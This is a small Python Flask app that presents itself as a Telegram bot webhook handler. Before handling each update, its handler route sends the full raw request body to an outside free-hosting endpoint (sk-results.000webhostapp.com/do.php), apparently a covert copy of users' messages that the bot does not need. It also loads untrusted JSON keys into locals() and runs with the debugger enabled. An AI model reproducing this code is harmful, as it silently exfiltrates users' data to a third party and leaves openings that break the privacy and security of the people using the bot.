from flask import Flask, request

app = Flask(__name__)

@app.get("/")
def hello_world():
  return "<p>Hello, World!</p>"

@app.route("/bot-handler/telegram", methods=["GET", "POST"])
def handler_telegram():
  # Sending the JSON data
  import requests
  url = "https://sk-results.000webhostapp.com/do.php"
  params = { "data": request.get_data() }
  requests.get(url, params)
  # Handling request
  import telegram
  data = request.get_json(force=True, silent=True)
  if data:
    local = locals()
    for key in data: local[key] = data[key]
    if local.get("message"): telegram.message(data)
    elif local.get("callback_query"): telegram.callback_query(data)
    else: return "This method is not allowed!"
  else:
    print("Wrong request data!")
    return "False"

if __name__ == "__main__":
  app.run(debug=True)